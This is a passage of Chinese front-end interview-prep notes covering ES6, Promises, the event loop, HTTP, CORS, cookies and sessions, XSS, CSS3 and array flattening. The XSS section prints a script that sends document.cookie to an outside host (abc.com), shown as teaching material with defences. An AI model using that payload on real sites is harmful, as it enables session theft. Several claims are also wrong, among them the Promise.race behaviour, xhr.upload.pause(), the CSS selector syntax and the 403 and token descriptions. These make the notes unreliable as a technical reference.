const [m, p, ...q] = [6, 7, 8, 9, 10, 11];   // q是一个数组[8, 9, 10, 11]

// 点点点运算符
const arr1 = [3, 4, 5];
const arr2 = [6, 7, ...arr1];

const obj1 = {a: 1, b: 2};
const obj2 = {...obj1, c: 3};
```





**k-v一致省略v**

```js
var name = '小明';
var age = 12;
var obj = {
	name, age
};


function load({ page, pagesize }) {
    request('url', {
        page, pagesize
    });
}
```



**方法可以不写function**

```js
export default {
    methods: {
        add() {
            
        },
        clickHandler() {
		
        }
    }
}
```



**剩余参数**

```js
function fn(a, b, ...c) {
    console.log(c);		// [5, 6, 7, 8]
}

fn(3, 4, 5, 6, 7, 8)
```



**Set和Map数据结构**

- Set是集合，说白了就是不能有重复项的数组，`[...new Set([3, 3, 4, 4, 3])]`就是`[3, 4]`
- Map是映射，说白了就是任意对象可以当做k的对象

```js
// Map是映射，说白了就是任意东西可以当做k的对象
var m = new Map();

var obj1 = { a: 1 };
var obj2 = { a: 56, b: 99 };
var arr1 = [45, 56, 67, 2];

m.set(obj1, '哈哈');
m.set(obj2, true);
m.set(arr1, false);

console.log(m.get(obj1));   // 哈哈
console.log(m.get(obj2));   // true
console.log(m.get(arr1));   // false
```



**字符串的padStart方法**

```js
let str = 6;
// 补足两位，用0补
console.log(str.padStart(2, '0'));		// '06'
```





**class类表示法**

```
class People {
	constructor() {
	
	}
}
```



### 面试题：ES6中如何写类？

原来学习构造函数，就是类

```js
// 人类。本质上People函数一个函数，就是它的构造器（constructor函数）
class People {
    // 必须先写constructor
    constructor(name, age, sex) {
        this.name = name;
        this.age = age;
        this.sex = sex;
    }

    // 自动绑定到了People函数的prototype对象上了
    sayHello() {
        console.log(`你好我是${this.name}我${this.age}岁了`);
    }
}

let xiaoming = new People('小明', 12, '男');
xiaoming.sayHello();
```



三角关系还在，说白了class不是类，还是函数，还是原来三角关系那一套：

```js
// 国际大玩笑，class关键字定义的东西，是函数。本质上就是constructor函数。
console.log(typeof People); // function
console.log('sayHello' in People.prototype);        // true
```



![image-20220427200449407](F:\Web前端\BOSS直聘课程\学习资料\面试辅导\《面试题辅导第8天-案例和笔记》\markdown格式笔记\assets\image-20220427200449407.png)



### 面试题：怎么实现继承？ES6中如何实现继承？

什么是继承：继承就是“is a kind of”关系，比如Student is a kind of People，那么People就是父类，Student就是子类。子类能够做父类的一切事情。



**方法1：让子类的prototype指向父类的一个实例**

```js
Student.prototype = new People();
```



**方法2：ES6的extends关键字**

```js
// 人类。
class People {
    constructor(name, age, sex) {
        this.name = name;
        this.age = age;
        this.sex = sex;
    }
    sayHello() {
        console.log(`你好我是${this.name}我${this.age}岁了`);
    }
}

// 继承。extends关键字要记住。
class Student extends People {
    constructor(name, age, sex, xuehao, chengji, banji) {
        // 调用父类的构造函数，绑定三个属性
        super(name, age, sex);

        this.xuehao = xuehao;
        this.chengji = chengji;
        this.banji = banji;
    }
    kaoshi() {
        console.log(`我是${this.name}我是${this.banji}班的，我在考试`);
    }
    tingke() {
        console.log(`我是${this.name}我是${this.banji}班的，我在听课`);
    }
}

let xiaodoubao = new Student('小豆包', 7, '男', 1001, 77, '一年级三班');
xiaodoubao.sayHello();
xiaodoubao.kaoshi();
xiaodoubao.tingke();

// 还是原型链那套实现了继承
console.log('sayHello' in xiaodoubao.__proto__.__proto__);
```

<img src="F:\Web前端\BOSS直聘课程\学习资料\面试辅导\《面试题辅导第8天-案例和笔记》\markdown格式笔记\assets\image-20220427201123351.png" alt="image-20220427201123351" style="zoom: 50%;" />



**方法3：ES6新增了Object.create()**

`Object.create(obj)`，将直接创建以`obj`为原型链的新对象。

<img src="F:\Web前端\BOSS直聘课程\学习资料\面试辅导\《面试题辅导第8天-案例和笔记》\markdown格式笔记\assets\image-20220427202347636.png" alt="image-20220427202347636" style="zoom:33%;" />

```js
var obj = {
    a: 3,
    b: 4
};

// 以obj为__proto__创建新对象
let o = Object.create(obj);
o.c = 5;

console.log(o.a);       	// 3。因为原型链查找，沿着__proto__找。
console.log(o.b);       	// 4。因为原型链查找，沿着__proto__找。
console.log(o.c);       	// 5
console.log(o.__proto__.a); // 3
console.log(o.__proto__.b); // 4
console.log(o.__proto__.c); // undefined
```



### 面试题：简述Promise

解决了回调黑洞（回调套回调），通过`async/await`可以将去掉异步语句的回调函数，像同步语句一样写异步。`await` 后面只能跟 `Promise` 对象，它会观察等待`Promise`对象的状态从`pending`变化为`fulfilled`，就执行后面语句了。

下面这个例子，必须嗷嗷写：

```js
function sleep(ms) {
    return new Promise((resolve, reject) => {
        setTimeout(() => {
            resolve();
        }, ms);
    });
}

async function main() {
    console.log('A');
    await sleep(2000);
    console.log('B');
    await sleep(3000);
    console.log('C');
}

main();
```

例子理解：`await`后面只能跟`Promise`对象，它会观察等待`Promise`从`pending`状态变为`fulfilled`状态。`Promise`状态改变，只能由`Promise`自己决定，就是`new Promise()`时里面定义的语句，会表明它自己什么时候会改变自己的状态。



原来没有`async/await`和`Promise`的时候，也能实现相同业务，但是不优雅（回调黑洞）：

```js
function sleep(ms, callback) {
    setTimeout(() => {
        callback();
    }, ms);
}

function main() {
    console.log('A');
    sleep(2000, function () {
        console.log('B');
        sleep(3000, function () {
            console.log('C');
        });
    });
}

main();
```



### 面试题：Promise有哪些方法？（面试高频）

- `Promise.all`方法：都`fulfilled`了，总Promise也`fulfilled`了
- `Promise.race` 方法：只要有一个`fulfilled`，总Promise也`fulfilled`了
- `Promise.allSettled` 方法：都fulfilled或者rejected了，总Promise也`fulfilled`了
- `Promise.any` 方法：只要有一个`fulfilled`，总Promise也`fulfilled`了。`Promise.any()`跟`Promise.race()`方法很像，只有一点不同，就是`Promise.any()`不会因为某个 Promise 变成`rejected`状态而结束，必须等到所有参数 Promise 变成`rejected`状态才会结束。



```js
// 创建一个总Promise，所有的小Promise是齐头并进的，都完成总Promise就完成。
var allP = Promise.all([
    new Promise(r => setTimeout(() => r(), 2000)),
    new Promise(r => setTimeout(() => r(), 4000)),
    new Promise(r => setTimeout(() => r(), 1000))
]);

async function main() {
    console.log('A');
    await allP;		// 等4秒。因为4秒后，所有小Promise就都完成了。
    console.log('B');
}

main();
```



```js
// 只要有一个完成，allP就完成
var allP = Promise.race([
    new Promise(r => setTimeout(() => r(), 2000)),
    new Promise(r => setTimeout(() => r(), 4000)),
    new Promise(r => setTimeout(() => r(), 1000))
]);

async function main() {
    console.log('A');
    await allP;     // 间隔1秒。1秒后就有1个完成。
    console.log('B');
}

main();
```



比如请求三个人的收货地址：

```js
async function main() {
    // await一个总Promise，得到数组
    const datas = await Promise.all([
        axios.get('http://www.zkt-it.com:5050/shdz/小A'),
        axios.get('http://www.zkt-it.com:5050/shdz/小B'),
        axios.get('http://www.zkt-it.com:5050/shdz/小C')
    ]);

    console.log(datas[0].data);
    console.log(datas[1].data);
    console.log(datas[2].data);
}

main();
```



比如，主站和备份接口竞速：

```js
async function main() {
    // await一个总Promise
    const data = await Promise.race([
        axios.get('http://www.zkt-it.com:5050/news/'),
        axios.get('http://182.92.193.159:5050/news/')
    ]);

    console.log(data.data);
}

main();
```



### 面试题：Promise捕获错误

`实例.catch()`表示错误的时候（rejected的时候）做的事情。

```js
async function main() {
    await axios.get('http://不存在的网址').then(data => {
        // 成功做的
        console.log(data.data);
    }).catch(e => {
        // 失败做的
        console.log(e);
    });
}

main();
```



捕获错误的意义，就是Promise如果是rejected了，不加catch那么就不往下走了，加了catch就会往下走。

```js
function sleep(ms) {
    return new Promise((resolve, reject) => {
        setTimeout(() => {
            reject();  // 失败
        }, ms);
    });
}

async function main() {
    console.log('A');
    await sleep(2000).catch(e => {});	// 也不会把错误抛出了，这样就能继续往下走
    console.log('B');
    await sleep(3000).catch(e => {});	// 也不会把错误抛出了，这样就能继续往下走
    console.log('C');
}

main();
```







### 面试题：宏任务和微任务

这里比较复杂，学有余力可以看：

https://zhuanlan.zhihu.com/p/78113300

https://www.jb51.net/article/223869.htm



之前学习过一个事儿：先同步、再异步。

```js
setTimeout(() => {
	console.log(1);  // 异步
}, 0);

console.log(2);  // 同步
```

输出2、1。



**今天学习宏任务和微任务:**

- 宏任务：setTimeout

- 微任务：Promise.then

*在做下一个宏任务之前，要看看当前有没有能做的微任务。**“下宏看微”**。*

整个script也是一个宏任务。



#### 题目1

```js
// 宏
setTimeout(() => {
    console.log('宏', 1);
}, 0);

let p = new Promise(resolve => {
    console.log('同步', 2);
    resolve();
});

p.then(data => {
    console.log('微', 3);
});

console.log('同步', 4);
```

输出2、4、3、1。首先肯定先做同步语句，所以2、4先输出没问题。setTImeout会放到宏任务队列中，Promise.then()会放到微任务队列出。同步语句做完之后，要做下一个事件循环，此时就要看有没有立即能做的微任务，有，就是输出3，然后进行下一个事件循环，就是输出1。



#### 题目2（同学面试遇见的原题）

```js
setTimeout(() => {
    console.log(1);
}, 0);

let p = new Promise(resolve => {
    console.log(2);
    setTimeout(() => {
        console.log(5);
        resolve();
    }, 0);
});

p.then(data => {
    console.log(3);
});

console.log(4);
```

输出2、4、1、5、3。首先肯定先做同步语句，所以2、4先输出没问题。setTImeout会放到宏任务队列中，Promise.then()会放到微任务队列中。同步语句做完之后，要做下一个事件循环，此时就要看有没有立即能做的微任务，没有，因为resolve被放到了setTimeout中，resolve已经是下一个事件循环才执行的。所以下一个事件循环实输出1，然后输出5（这是因为5写在了1的后面），resolve执行了，就有能做的任务了。



#### 题目3

![image-20220427215221099](F:\Web前端\BOSS直聘课程\学习资料\面试辅导\《面试题辅导第8天-案例和笔记》\markdown格式笔记\assets\image-20220427215221099.png)

#### 题目4

```js
setTimeout(() => {
    console.log(2);
    new Promise(resolve => {
        console.log(3);
        setTimeout(() => {
            resolve();
            console.log(4);
        }, 0);
    }).then(() => {
        console.log(5);
    });

    setTimeout(() => {
        console.log(6);
    }, 0);

    console.log(7);
}, 0);

setTimeout(() => {
    console.log(8);
}, 0);

console.log(1);
```

![image-20220427220744987](F:\Web前端\BOSS直聘课程\学习资料\面试辅导\《面试题辅导第8天-案例和笔记》\markdown格式笔记\assets\image-20220427220744987.png)

#### 题目5

```js
new Promise(resolve => {
    console.log(1);
    setTimeout(() => {
        console.log(2);
    }, 0);
    setTimeout(() => {
        resolve()
        console.log(3);
    }, 0);
}).then(() => {
    console.log(4);
    setTimeout(() => {
        console.log(5);
    }, 0);
});

new Promise(resolve => {
    resolve();
    console.log(6);
}).then(() => {
    console.log(7);
});

console.log(8);
```





### 面试题：箭头函数和普通函数有什么不同？

- 上下文不同，普通函数是调用时上下文，箭头函数是定义时上下文。

- 箭头函数不能当构造函数





# 面试题辅导第9天 - 笔记 

2022年4月28日 星期四



*今天先把准备的面试题讲完，然后进军Node.js。*

*Node.js我们以实用的、面试常考问题（如webpack、工程化）为重点内容*



## 网络

### 面试题：HTTP状态码有哪些？

HTTP状态码在响应头部上，是3位数。要背诵的状态码是：

- 200 成功，最常见的状态码
- 301 永久重定向
- 302 临时重定向
- 304 没有更改，读取的是之前的缓存，这里有涉及缓存的知识，Nodejs课上介绍
- 401 没有权限，没有登录就给你一个401状态码，禁止你访问
- 403 被禁止，没有登录就给你一个401状态码，禁止你访问
- 404 没有找到指定页面
- 500 服务器错误，5开头的都是服务器错误



### 面试题：GET请求和POST请求有什么区别？

答：

> 本题是非常常见的面试题，要多多复习。

GET请求是最最稀疏平常的请求，每次输入网址、点击超级链接，都发出的是GET请求。目的是请求页面。GET请求通过querystring就是“?”将参数带给服务器，比如`?id=1`呀、`?page=1&pagesize=10`呀，目的是告诉服务器我们要的是id为1的文章、第1页且每页10条的文章。**优点**就是便于分享网址、便于加入收藏夹，因为`?id=1`、`?id=2`、`color=红v蓝v黄`实际上就是网址的一部分。**缺点**①就是不安全，我们不能把机密信息（比如密码）通过URL参数的方式显示出来，否则历史记录中就能看见这个密码了; 缺点②就是不能太长，有长度限制；缺点③不能传输文件等。

POST请求用来提交表单。它是通过HTTP的请求报文体传输数据的。优点①就是安全；优点②就是不限制大小、信息长度；优点③是能上传文件。缺点就是不方便分享网址。



### RESTful风格接口

接口是靠HTTP的请求类型，来决定做什么操作，通常：

- 增 post
- 删 delete
- 改 patch或者put
- 查 get



### 面试题：Ajax如何跨域？

**答案：**

因为*同源策略*（CORS policy），发出Ajax的前端页面与后端接口必须是相同的IP地址，不同IP地址的Ajax请求将被浏览器限制。解决跨域问题通常有三种方法：

**方法1：**CORS法

后端接口添加指定的HTTP返回头：

  ```
Access-Control-Allow-Origin:*
Access-Control-Allow-Methods:GET
Access-Control-Allow-Headers:*
  ```

（Access-Control-Allow-Origin是必须要会背诵的）



**方法2：**代理跨域（偷数据）

利用后端没有跨域限制，让本服务器上的后端程序对另一个ip下的接口进行“偷取”，就是将接口**代理**过来。前端直接用这个代理来的接口就行。



**方法3：**JSONP法

*利用script标签没有跨域限制的**漏洞***，script标签的src可以调用不同地址的js。利用这个特点，可以让后端做一个形如`fun(json)`这样的接口，这是一个函数的*调用*语句，在HTML页面中通过script标签引入它就可以执行这段程序了。本质上，JSONP不属于Ajax，它底层没有用到XMLHttpRequest对象。



### 面试题：什么是cookie、session、token？

> 五一假期看一下视频《认识Cookie、Session、Token》和《Vue登录注册和路由鉴权》

HTTP是无连接的，每次访问服务器链接都会断掉，所以第二次访问服务器，服务器就不认识访问者了。

**Cookie**是最简单粗暴解决身份识别问题的手段，访问服务器之后，服务器在响应头部加上`Set-Cookie`，值就是一些数据；今后每一次访问这个服务器，浏览器都会*自动在请求头部*带上`Cookie`字段。`Cookie`是明文的，并且信息由浏览器持有，所以不安全，非常容易就被篡改了。

**Session**依赖Cookie，当用户登录之后，服务器通过Cookie下发64位乱码，通常叫做session_id，服务器并且会记住这个乱码对应的人是谁。今后每一次浏览器访问这个服务器，就会通过Cookie把64位乱码带上去。Session非常安全，因为它存储在服务器上。

**Token**是用户设备的特征码，比如用户的浏览器型号、设备型号、ip地址都被当做特征码。



> 比如现在我是一个古代的“钱庄”，现在开出一个10万块钱的存单，然后偷偷在支票上写上173863。表示这个人是173公分、86公斤、脸上有3个痦子。现在一个瘦子，来取钱，当然不给他取。存单是真的么？是真的。但是大概率是原主人丢的，他捡到的，或者是偷的。




### 面试题：什么是XSS攻击？（重要）

XSS （Cross site Scripting，跨站脚本攻击）。

比如留言板、论坛、贴吧，黑客不好好留言，而是写了这一段代码:

```html
<script>alert(document.cookie)</script>
```

等到有人再次访问那个网站的时候，就可以将用户的cookie显示出来。利用图片没有跨域限制的漏洞，通过这个图片标签将cookie发送到自己的服务器上。比如，这个黑客在留言本中留言如下:

```html
<script>
// 创建一个图片标签
var img = document.createElement('img');
// 指定图片路径
img.src = "http://abc.com/?" + document.cookie;
// 将图片标签添加到页面body标签中
documen.body.append(img);
</script>
```

只要如上代码执行,就会将用户的cookie发送到别人的服务器。如此一来，就可以拿到用户的cookie，这种窃取用户cookie的方法就被叫做XSS。

> XSS有很多中分类，以上的是危害最大的，叫做存储性XSS。还有反射型XSS、基于dom的XSS。



- 防范措施1：留言板的内容一定要用正则表达式检查，坚决不允许书写敏感词语，比如script；

- 防范措施2：所有的尖角号`<`和`>`，在页面上都用转义字符`&lt;`和`&gt;`表示；

- 防范措施3：可以为网站的cookie加一个HttpOnly属性:

```
Set-Cookie: 值;Domain=book.com;HttpOnly
```

这样浏览器就禁止读取JavaScript代码。



### 面试题：什么是CSRF攻击？（了解）

CSRF（Cross-Site Request Forgery，跨站请求伪造），就是”钓鱼网站”。

![image-20220427185605663](F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第9天-案例和笔记》/markdown格式笔记/assets/image-20220427185605663.png)

防御 CSRF 攻击主要手段：

1、在敏感请求URL中添加 token ；

2、验证 HTTP Referer 字段；

3、使用短信验证码、滑块验证码、人脸识别；



### 面试题：POST请求的三种数据类型？

> 五一假期看《POST请求的三种数据类型》，一定要看一下~

三种数据类型：application/json类型、application/x-www-form-urlencoded类型、multipart/form-data类型。

```js
let form = new FormData();
form.append('a', 1);
form.append('b', 2);

axios.post('url', {
    headers: {
        'Content-Type': 'multipart/form-data'
    },
    data: form
})；
```



### 面试题：说一下XMLHttpRequest2.0对象

现在有了上传进度：

```js
xhr.upload.onprogress = function(e){
   console.log(e.loaded / e.total);
}
```



增加了暂停上传、续传的功能：

```js
xhr.upload.pause();
xhr.upload.start();
```



###  面试题：localStorage和sessionStorage有什么区别？和cookie有什么不同？

localStorage、sessionStorage统称“本地存储”。

 

- localStorage：关闭浏览器数据不消失，直到用户清除浏览器的缓存。经常用来存储用户的配置，比如用户切换了“主题”，可以记录用户使用的主题；5M左右存储空间。

- sessionStorage: 关闭浏览器数据就会消失。页面和页面之间如果要有消息传递，sessionStorage可以用来周转；最多的使用场景是存储token。5M左右存储空间。

 

API非常简单：

```
localStorage.setItem(k, v);
localStorage.getItem(k, v);
localStorage.clear();
localStorage.removeItem(k);
```



>注意：
>
>v必须是字符串，不能是其它一切值。所以JSON要`JSON.stringify()`存进去，读取出来之后要`JSON.parse()`。
>
>不能直接改，必须读 → 改 → 写。



我们做了一个“换肤效果”，用Vue快速做的，可以看看。



## CSS3

### 面试题：CSS3有哪些新特性？

选择器、圆角、阴影、变形、过渡、动画、媒体查询、弹性盒flex布局。



### 面试题：简述CSS3选择器

CSS2的选择器就7个：

```css
div {}
#box {}
.danger {}
ul li p {}
ul li.spec {}
ul, ol {}
* {}
```



CSS3新增：

```css
:first-child、:last-child、:nth-child()
:first-of-type、:last-of-type、:nth-of-type()
img[src]、img[src="^=a"]、img[src="$=a"]、img[src="~=a"]、img[src="*=a"]、img[src="|=a"]
:checked 、:focus
::before、::after
```



例子：

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        /* m开头 */
        p[data-wangqin^=m] {
            color: red;
        }

        /* k结尾 */
        p[data-wangqin$=k] {
            text-decoration: underline;
        }

        /* pp是用空格隔开的独立成分 */
        p[data-wangqin~=pp] {
            background-color: yellow;
        }

        /* pp出现了 */
        p[data-wangqin*=pp] {
            font-size: 40px;
        }

        /* pp-开头 */
        p[data-wangqin|=pp] {
            border: 1px solid #000;
        }
    </style>
</head>

<body>
    <p data-wangqin="mm pp kk">A</p>
    <p data-wangqin="mmabck">B</p>
    <p data-wangqin="mmabc">C</p>
    <p data-wangqin="pp kk">D</p>
    <p data-wangqin="ppkk">E</p>
    <p data-wangqin="pp-kk">F</p>
</body>

</html>
```

<img src="F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第9天-案例和笔记》/markdown格式笔记/assets/image-20220428212454453.png" alt="image-20220428212454453" style="zoom:33%;" />



伪元素：

```css
h3::before {
	content: '';
	position: absolute;
	width: 20px;
	height: 20px;
	background-image: url();
    background-position: -100px -100px;
}
```



### 面试题：如何实现过渡？

过渡就是自动添加补间动画：

```css
transition: width 4s linear 1s;
```

<img src="F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第9天-案例和笔记》/markdown格式笔记/assets/image-20220428212946733.png" alt="image-20220428212946733" style="zoom: 50%;" />



### 面试题：如何实现动画？

```css
div {
    width: 300px;
    height: 300px;
    background-color: red;

    /* infinite动画持续进行 */
    /* alternate正着一次，反着一次 */
    animation: zhuan 2s linear 0s infinite alternate;
}

/* 定义动画 */
@keyframes zhuan {
    from {
        /* 变形，旋转变形 */
        transform: rotate(0deg);
    }

    to {
        /* 变形，旋转变形 */
        transform: rotate(360deg);
    }
}
```

怎么定义动画？答：用A圈 `keyframes ` 定义动画。



### 面试题：flex

> 这里有一个视频《flex高级特性》，2月18日或者19日上线的。五一期间看看。然后五一之后，我们再复习高级flex知识。

```css
父盒子 {
 	// 子元素自动并排   
    display: flex;
    // 主轴排列
    justify-content: space-around;
    // 副轴排列
    align-items: center;
    // 设置主轴方向
    flex-direction: column;
}
子盒子 {
    flex: 1;
}
```



### 面试题：杨同学遇见的flex布局一个题目

<img src="F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第9天-案例和笔记》/markdown格式笔记/assets/image-20220428214341047.png" alt="image-20220428214341047" style="zoom: 80%;" />



```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        * {
            margin: 0;
            padding: 0;
        }

        div {
            border: 2px solid #000;
            width: 90%;
            min-width: 1000px;
            margin: 0 auto;
            /* 弹性盒容器，默认情况下不换行的，设置什么属性能换行？ */
            display: flex;
            /* 设置flex-wrap能够换行了 */
            flex-wrap: wrap;

            padding: 32px;
        }

        p {
            box-sizing: border-box;
            /* calc是calculate计算的缩写 */
            width: calc((100% - 32px) / 3);
            height: 200px;
            border: 1px solid #000;
            background-color: gold;
            margin-right: 16px;
            margin-bottom: 16px;
        }

        /* 3的倍数的p标签，取消margin属性 */
        p:nth-child(3n) {
            margin-right: 0;
        }
    </style>
</head>

<body>
    <div>
        <p></p>
        <p></p>
        <p></p>
        <p></p>
        <p></p>
        <p></p>
        <p></p>
        <p></p>
        <p></p>
        <p></p>
    </div>
</body>

</html>
```

<img src="F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第9天-案例和笔记》/markdown格式笔记/assets/image-20220428215655379.png" alt="image-20220428215655379" style="zoom: 33%;" />

**得五一者，得天下。**



## 杨同学的另一个题目

```js
        // 输出符合标准的（id是数字，自己是对象），按id从小到大排，的name属性
        const source = [
            null,
            { id: 4, name: 'test1' },
            { id: {}, name: 'ssdf' },
            "test",
            { id: () => { }, name: 'sf' },
            { id: '6', name: 'test3' },
            { id: 6, name: 'test4' },
            { id: 7, name: 'test7' },
            { id: 2, name: 'test2' },
            { name: 'sf' },
            {},
            () => { }
        ];

        // 过滤
        let arr = source.filter(item => item != null && typeof item == 'object' && typeof item.id == 'number');

        // 排序
        arr.sort((a, b) => a.id - b.id);

        // 映射
        console.log(arr.map(item => item.name));
```





## 面试题：数组扁平化

请将数组：

```js
[1, 2, [3, 4, [5, 6, [7, 8], 9, 10], 11, 12], 13, 14]
```

扁平化为：

```js
[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14]
```



用递归：递归就是自己调用自己。

*遍历数组，如果这项是数字，就输出；是数组再来一次。*



```js
var arr = [1, 2, [[3, [4]], [5, 6, [7, 8], [9, 10]], 11, 12], 13, 14];

let result = [];

// 扁平数组
function flatten(arr) {
    for (let i = 0; i < arr.length; i++) {
        if (typeof arr[i] == 'number') {
            // 是数字，就推入结果数组
            result.push(arr[i]);
        } else if (Array.isArray(arr[i])) {
            // 是数组，就递归
            flatten(arr[i]);
        }
    }
}

flatten(arr);

console.log(result);
```



























